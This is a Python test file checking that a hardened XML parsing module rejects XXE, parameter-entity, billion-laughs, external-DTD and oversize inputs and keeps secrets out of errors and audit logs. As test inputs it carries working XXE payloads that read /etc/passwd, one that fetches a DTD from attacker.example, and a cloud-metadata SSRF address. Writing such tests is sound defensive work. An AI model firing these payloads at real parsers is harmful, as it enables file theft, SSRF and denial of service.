"""Behavioural tests for the XXE hardening, not just the contract."""

import pytest

import security.xxe_entity_guard as mod
from security.xxe_entity_guard import (
    ElementRule,
    Schema,
    XmlSecurityPolicy,
    parse_secure,
)

SECRET = "/etc/passwd"


def test_classic_xxe_is_rejected():
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE document [<!ENTITY xxe SYSTEM "file://{SECRET}">]>
<document><item>&xxe;</item></document>"""
    outcome = parse_secure(payload)
    assert not outcome.ok
    assert outcome.root is None
    assert outcome.code == "XML_DTD_FORBIDDEN"


def test_parameter_entity_xxe_is_rejected():
    payload = """<!DOCTYPE document [
      <!ENTITY % remote SYSTEM "http://attacker.example/dtd">
      %remote;
    ]><document/>"""
    assert parse_secure(payload).code == "XML_DTD_FORBIDDEN"


def test_billion_laughs_is_rejected():
    payload = """<!DOCTYPE lolz [
      <!ENTITY lol "lol">
      <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    ]><lolz>&lol1;</lolz>"""
    assert parse_secure(payload).code == "XML_DTD_FORBIDDEN"


def test_external_dtd_is_rejected():
    payload = f"""<!DOCTYPE document SYSTEM "file://{SECRET}">
<document/>"""
    assert parse_secure(payload).code == "XML_DTD_FORBIDDEN"


def test_benign_document_parses():
    outcome = parse_secure("<document><item id='1'>hi</item></document>")
    assert outcome.ok
    assert outcome.code == "XML_OK"
    assert outcome.root.tag == "document"


def test_doctype_before_root_is_not_reported_as_syntax_error():
    """Code must distinguish policy rejection from malformed XML."""
    assert parse_secure("<!DOCTYPE document><document/>").code == "XML_DTD_FORBIDDEN"
    assert parse_secure("<document>").code == "XML_SYNTAX"


def test_size_limit():
    policy = XmlSecurityPolicy(max_bytes=8)
    assert parse_secure("<document/>", policy).code == "XML_TOO_LARGE"


def test_depth_limit():
    policy = XmlSecurityPolicy(max_depth=3)
    payload = "<a><b><c><d/></c></b></a>"
    assert parse_secure(payload, policy).code == "XML_DEPTH_EXCEEDED"


def test_timeout_limit():
    policy = XmlSecurityPolicy(timeout=-1.0)
    assert parse_secure("<document/>", policy).code == "XML_TIMEOUT"


def test_non_text_input_rejected():
    assert parse_secure(None).code == "XML_NOT_TEXT"
    assert parse_secure(123).code == "XML_NOT_TEXT"


def test_schema_validation():
    schema = Schema(
        root="document",
        rules={
            "document": ElementRule(children=frozenset({"item"})),
            "item": ElementRule(attributes=frozenset({"id"})),
        },
    )
    good = "<document><item id='1'/></document>"
    bad = "<document><other/></document>"
    assert parse_secure(good, schema=schema).code == "XML_OK"
    assert parse_secure(bad, schema=schema).code == "XML_SCHEMA_INVALID"
    assert mod.schema_validate(good, schema).allowed


def test_error_redact_never_leaks_content():
    try:
        parse_secure("<!DOCTYPE document [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><document/>")
    except Exception as exc:  # pragma: no cover - parse_secure does not raise
        err = exc
    else:
        err = ValueError(f"failed reading {SECRET}: root:x:0:0")
    payload = mod.error_redact(err)
    assert payload["code"] == "XML_INTERNAL"
    assert SECRET not in payload["message"]
    assert "root:x" not in str(payload)


def test_audit_records_no_document_content():
    marker = "TOPSECRETVALUE"
    parse_secure(f"<!DOCTYPE document [<!ENTITY x '{marker}'>]><document/>")
    record = mod.audit("test.marker", "XML_DTD_FORBIDDEN")
    assert marker not in str(record)
    assert all(marker not in str(r) for r in mod.AUDIT_LOG)


@pytest.mark.parametrize("target", [f"file://{SECRET}", "http://169.254.169.254/"])
def test_oob_and_network_denied(target):
    assert not mod.oob_block(target).allowed
    assert not mod.local_file_deny(target).allowed
    assert not mod.url_deny(target).allowed


def test_external_entity_guard_detects_system_ref():
    payload = '<!DOCTYPE d [<!ENTITY e SYSTEM "file:///etc/passwd">]><d/>'
    assert not mod.external_entity(payload).allowed
    assert mod.external_entity("<d/>").allowed


def test_disable_dtd_guard():
    assert not mod.disable_dtd("<!DOCTYPE d><d/>").allowed
    assert not mod.disable_dtd(b"\xff\xfe<\x00!\x00D\x00O\x00C\x00T\x00Y\x00P\x00E\x00").allowed
    assert mod.disable_dtd("<d/>").allowed


def test_entity_depth_limit():
    assert mod.entity_depth(0, 0).allowed
    assert not mod.entity_depth(1, 0).allowed
    assert not mod.entity_depth(1, -1).allowed


def test_parser_feature_fails_closed():
    assert not mod.parser_feature(None, "load_dtd", True).allowed
    assert mod.parser_feature(None, "load_dtd", False).allowed
    assert mod.parser_feature(None, "some_unknown_feature", True).allowed is False


def test_sanitize_strips_doctype_and_keeps_clean_docs():
    dirty = '<!DOCTYPE d [<!ENTITY e "x">]><d><v>ok</v></d>'
    result = mod.sanitize(dirty)
    assert result.removed and result.allowed
    assert b"DOCTYPE" not in result.data
    assert parse_secure(result.data).ok

    clean = mod.sanitize("<d>ok</d>")
    assert not clean.removed and clean.allowed


def test_sanitize_preserves_doctype_in_comments():
    doc = b"<!-- <!DOCTYPE x> --><d/>"
    result = mod.sanitize(doc)
    assert result.removed is False
    assert result.data == doc


def test_sanitize_fails_closed_on_unterminated_doctype():
    assert not mod.sanitize("<!DOCTYPE d [ <!ENTITY e 'x'>").allowed


def test_sanitize_fails_closed_on_dangling_entity_reference():
    result = mod.sanitize('<!DOCTYPE d [<!ENTITY e "x">]><d>&e;</d>')
    assert result.removed
    assert not result.allowed
    assert result.code == "XML_SYNTAX"


def test_sanitize_rejects_utf16():
    result = mod.sanitize(b"\xff\xfe<\x00d\x00/\x00>\x00")
    assert not result.allowed
    assert result.code == "XML_ENCODING_UNSUPPORTED"


def test_size_and_timeout_guards():
    assert mod.size_limit(b"x" * 10, 10).allowed
    assert not mod.size_limit(b"x" * 11, 10).allowed
    assert mod.timeout(0.5, 1).allowed
    assert not mod.timeout(2, 1).allowed


def test_validation_and_fallback_shapes():
    assert mod.validation("<d/>").ok
    assert mod.schema_validate("<d/>").code == "XML_SCHEMA_MISSING"
    assert mod.fallback("XML_SYNTAX")["error"]["code"] == "XML_SYNTAX"
